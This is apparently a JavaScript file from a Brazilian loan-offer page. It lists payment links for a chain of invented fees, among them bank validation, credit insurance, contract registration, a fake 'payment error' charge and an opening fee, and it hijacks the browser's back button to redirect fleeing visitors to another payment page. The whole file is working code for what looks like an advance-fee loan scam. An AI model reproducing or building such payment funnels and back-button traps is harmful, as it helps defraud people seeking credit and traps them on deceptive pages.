   const baseLinks = {
  up2: "https://pay.aglicenter.shop/PyE2Zy8rpW03qRb", // Validação Bancaria
  up3: "https://pay.aglicenter.shop/a9ArZMlL8V837xj", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.aglicenter.shop/meABG9dLpYvZ6Ea", // NFe
  up5: "https://pay.aglicenter.shop/eApQgz2jpaygEb7", // Ativar conta
  up6: "https://pay.aglicenter.shop/KV603kompeL3w8y", // Taxa de registro do contrato
  up7: "https://pay.aglicenter.shop/PVYB34eyAvLZKzk", // ParabÃ©ns, 20k adicional
  up8: "https://pay.aglicenter.shop/v7R0glompW5GVr9", // Erro no pagamento - 14,06
  up9: "https://pay.aglicenter.shop/4KovG1QNDwzGyDE", // APP - 11,99
  up10: "https://pay.aglicenter.shop/YEwR3AVLA29ZdKy", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.aglicenter.shop/zj6aGnAmpkWZwlK", // Taxa de Consultoria Financeira - 19,53
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink =
  "https://pay.app-agil.online/v7R0gloJxP6GVr9";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};